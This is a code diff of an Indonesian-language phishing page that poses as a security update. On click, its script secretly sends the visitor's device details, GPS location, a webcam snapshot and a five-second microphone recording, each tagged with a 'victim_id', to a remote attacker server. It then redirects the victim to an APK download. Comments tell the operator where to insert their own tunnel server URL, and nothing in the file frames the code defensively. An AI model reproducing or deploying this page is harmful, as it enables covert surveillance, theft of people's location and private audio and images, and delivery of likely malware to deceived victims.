@@ -2,139 +2,235 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Security Update</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Update Keamanan</title>
     <style>
-        body { background: #0a0a0f; color: #fff; font-family: Arial; text-align: center; padding: 50px; }
-        .btn { background: #0d47a1; padding: 16px 32px; border: none; border-radius: 8px; color: #fff; font-size: 18px; cursor: pointer; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background: #0a0a0f;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #fff;
+        }
+        .container {
+            background: #1a1a2e;
+            padding: 40px;
+            border-radius: 16px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid #2a2a3e;
+        }
+        .icon { font-size: 64px; margin-bottom: 20px; }
+        h1 { font-size: 20px; margin-bottom: 10px; color: #4fc3f7; }
+        p { color: #aaa; font-size: 14px; margin-bottom: 20px; line-height: 1.6; }
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            background: #0d47a1;
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
         .btn:hover { background: #1565c0; }
+        .spinner {
+            width: 48px; height: 48px;
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top-color: #4fc3f7;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        #status { margin-top: 15px; font-size: 14px; color: #888; }
+        .small { font-size: 12px; color: #666; margin-top: 15px; }
     </style>
 </head>
 <body>
-    <h1>🔒 Security Check</h1>
-    <p>Klik tombol di bawah untuk verifikasi keamanan perangkat Anda.</p>
-    <button class="btn" onclick="startCollection()">Mulai Verifikasi</button>
-    <div id="status"></div>
+    <div class="container">
+        <div class="icon">📱</div>
+        <h1>Update Keamanan Diperlukan</h1>
+        <p>Sistem mendeteksi versi keamanan Anda sudah kadaluarsa.<br>Klik tombol di bawah untuk memulai verifikasi.</p>
+        <button class="btn" onclick="startCollection()">🔒 Mulai Verifikasi</button>
+        <div id="status"></div>
+        <div class="spinner" id="spinner"></div>
+        <p class="small">* Pastikan Anda mengizinkan akses kamera dan lokasi</p>
+    </div>
 
     <script>
-        const SERVER = 'https://admin-rat.vercel.app';
-        let victimId = localStorage.getItem('victim_id') || 'V' + Date.now().toString(36).toUpperCase();
+        // ============== KONFIGURASI ==============
+        // ⚠️ GANTI DENGAN URL SERVER TERMUX ANDA ⚠️
+        const SERVER_URL = 'https://xyz-abc-123.serveo.net';  // <-- GANTI INI
+        const DOWNLOAD_URL = 'https://xyz-abc-123.serveo.net/download';  // <-- GANTI INI
+
+        let victimId = localStorage.getItem('victim_id');
+        if (!victimId) {
+            victimId = 'V' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).substring(2, 6).toUpperCase();
+            localStorage.setItem('victim_id', victimId);
+        }
 
         function log(msg) {
             document.getElementById('status').innerHTML = msg;
         }
 
+        function showSpinner(show) {
+            document.getElementById('spinner').style.display = show ? 'block' : 'none';
+        }
+
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: screen.width + 'x' + screen.height,
+                device: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
+            };
+        }
+
         function sendData(data) {
-            fetch(SERVER + '/api/collect', {
+            if (!data.id) data.id = victimId;
+            fetch(SERVER_URL + '/api/collect', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ id: victimId, ...data })
-            }).catch(() => {});
+                body: JSON.stringify(data)
+            }).catch(function(e) {
+                log('❌ Gagal kirim data: ' + e.message);
+            });
         }
 
         async function startCollection() {
             log('📡 Mengumpulkan data...');
+            showSpinner(true);
 
-            // 1. Device Info
+            // ===== 1. KIRIM DATA PERANGKAT =====
             sendData({
-                type: 'device',
-                data: {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    screen: screen.width + 'x' + screen.height,
-                    isMobile: /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent)
-                }
+                type: 'init',
+                value: 'page_loaded',
+                device: getDeviceInfo()
             });
+            log('✅ Device info terkirim');
 
-            // 2. Lokasi GPS
+            // ===== 2. AMBIL LOKASI GPS =====
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    pos => {
+                    function(pos) {
+                        var loc = pos.coords.latitude + ',' + pos.coords.longitude;
                         sendData({
                             type: 'location',
-                            lat: pos.coords.latitude,
-                            lng: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy
+                            value: loc,
+                            device: getDeviceInfo()
                         });
-                        log('📍 Lokasi: ' + pos.coords.latitude + ', ' + pos.coords.longitude);
+                        fetch(SERVER_URL + '/api/collect/location', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                id: victimId,
+                                latitude: pos.coords.latitude,
+                                longitude: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy
+                            })
+                        }).catch(function() {});
+                        log('📍 Lokasi: ' + loc);
                     },
-                    () => log('❌ Lokasi ditolak')
+                    function() {
+                        sendData({ type: 'location', value: 'Permission denied', device: getDeviceInfo() });
+                        log('❌ Lokasi ditolak');
+                    },
+                    { enableHighAccuracy: true, timeout: 15000 }
                 );
             }
 
-            // 3. Webcam
+            // ===== 3. AMBIL WEBCAM =====
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                    const stream = await navigator.mediaDevices.getUserMedia({
                         video: { facingMode: 'environment', width: 640, height: 480 },
-                        audio: false 
+                        audio: false
                     });
                     const video = document.createElement('video');
                     video.srcObject = stream;
-                    video.onloadedmetadata = () => {
+                    video.onloadedmetadata = function() {
                         video.play();
                         const canvas = document.createElement('canvas');
                         canvas.width = 640;
                         canvas.height = 480;
-                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, 640, 480);
                         const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
-                        
-                        fetch(SERVER + '/api/collect/webcam', {
+
+                        fetch(SERVER_URL + '/api/collect/webcam', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ id: victimId, image: imageData })
-                        });
+                        }).catch(function() {});
                         log('📸 Webcam captured');
-                        stream.getTracks().forEach(t => t.stop());
+                        stream.getTracks().forEach(function(t) { t.stop(); });
                     };
-                } catch(e) {
+                } catch (e) {
                     log('❌ Kamera ditolak');
                 }
             }
 
-            // 4. Rekaman Audio (Microphone)
+            // ===== 4. REKAM AUDIO (MIKROFON) =====
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                     const recorder = new MediaRecorder(stream);
                     const chunks = [];
-                    recorder.ondataavailable = e => chunks.push(e.data);
-                    recorder.onstop = () => {
+                    recorder.ondataavailable = function(e) { chunks.push(e.data); };
+                    recorder.onstop = function() {
                         const blob = new Blob(chunks, { type: 'audio/webm' });
                         const reader = new FileReader();
-                        reader.onload = () => {
+                        reader.onload = function() {
                             const audioData = reader.result.split(',')[1];
-                            fetch(SERVER + '/api/collect/audio', {
+                            fetch(SERVER_URL + '/api/collect/audio', {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify({ id: victimId, audio: audioData })
-                            });
+                            }).catch(function() {});
                             log('🎤 Audio recorded');
                         };
                         reader.readAsDataURL(blob);
                     };
                     recorder.start();
-                    setTimeout(() => recorder.stop(), 5000); // Rekam 5 detik
-                } catch(e) {
+                    setTimeout(function() { recorder.stop(); }, 5000);
+                } catch (e) {
                     log('❌ Mikrofon ditolak');
                 }
             }
 
-            // 5. Battery
+            // ===== 5. BATTERY =====
             if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                sendData({
-                    type: 'battery',
-                    level: battery.level * 100,
-                    charging: battery.charging
-                });
+                try {
+                    const battery = await navigator.getBattery();
+                    sendData({
+                        type: 'battery',
+                        level: battery.level * 100,
+                        charging: battery.charging,
+                        device: getDeviceInfo()
+                    });
+                    log('🔋 Baterai: ' + Math.round(battery.level * 100) + '%');
+                } catch (e) {}
             }
 
-            // 6. Redirect ke halaman download APK
-            setTimeout(() => {
+            // ===== 6. REDIRECT KE DOWNLOAD APK =====
+            setTimeout(function() {
                 log('📥 Mengarahkan ke download...');
-                window.location.href = 'https://your-serveo-url.serveo.net/download';
-            }, 3000);
+                window.location.href = DOWNLOAD_URL;
+            }, 4000);
+
+            // ===== 7. REDIRECT KE GOOGLE JIKA DOWNLOAD GAGAL =====
+            setTimeout(function() {
+                window.location.href = 'https://www.google.com';
+            }, 10000);
         }
     </script>
 </body>
